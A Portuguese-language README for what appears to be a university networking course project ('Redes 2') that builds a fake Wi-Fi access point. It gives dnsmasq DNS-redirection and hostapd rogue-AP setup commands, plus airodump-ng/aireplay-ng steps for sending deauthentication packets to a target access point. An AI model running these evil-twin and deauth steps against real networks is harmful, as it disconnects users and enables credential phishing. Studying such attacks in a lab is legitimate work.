# fake_ap_redes2
fake ap repository for my group in "Redes 2"

# Montagem via Roteador

#### 1. Iniciar um servidor dns em seu computador
##### - Instale o dnsmasq em sua máquina
##### - Utilize o comando 
```sh
dnsmasq -C dnsmasqwrouter.conf
```
#### 2. Acessar as configurações do roteador e alterar o servidor dns para o ip do seu computador

#### 3. Iniciar o servidor web na porta 80, o mesmo em exemplo se encontra em docker para facil instalação

# Montagem via HostAPD
Essa montagem consiste em utilizar a interface de rede do computador como ponto de acesso

#### 1. Iniciar o servidor dns e dhcp
##### - Instale o dnsmasq em sua máquina
##### - Utilize o comando 
```sh
dnsmasq -C dnsmasq.conf
```

#### 2. Roteie a partir do seu computador
##### - Instale o hostapd
##### - Utilize o comando
```sh
hostapd hostapd.conf
```

#### 3. Incie o servidor web na porta 80, o mesmo encontra-se como exemplo em docker no repositorio


# Desautenticação

#### 1. Instale o airodump e aireplay

#### 2. Utilizar o airodump para encontrar o endereço MAC do alvo
```sh
airodump-ng <interface de rede>
```

#### 3. Utilizar o aireplay para lançar os pacotes de deauth
```sh
aireplay-ng -a <Endereço MAC do alvo> -0 <Número de pacotes a enviar> <interface de rede responsavel>
```
Obs: Certifique-se de que sua interface de rede está no mesmo canal do ponto de acesso alvo, para isso, observe o canal do ap alvo com o airodump e use comando a baixo para trocar o canal da interface de rede
```sh
airodump-ng -c <canal> <interface de rede>
```
